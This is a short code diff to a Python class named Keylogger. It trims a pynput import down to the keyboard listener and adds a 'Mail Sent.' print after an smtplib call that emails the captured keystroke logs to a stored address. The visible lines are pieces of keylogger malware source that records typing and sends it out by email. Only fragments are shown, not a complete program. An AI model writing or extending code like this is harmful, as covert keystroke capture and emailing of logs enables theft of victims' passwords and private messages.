@@ -1,6 +1,6 @@
 import smtplib
 import datetime
-from pynput import mouse, keyboard
+from pynput import keyboard
 from threading import Timer
 
 
@@ -46,6 +46,7 @@ class Keylogger:
         log_date = datetime.datetime.now()
         msg = f'Subject: Log info\n {log_date}: {self.logs}'  
         smtpObj.sendmail('KeyLogger', self.email, msg)
+        print("Mail Sent.")
         # End the smtp session
         smtpObj.quit()
 
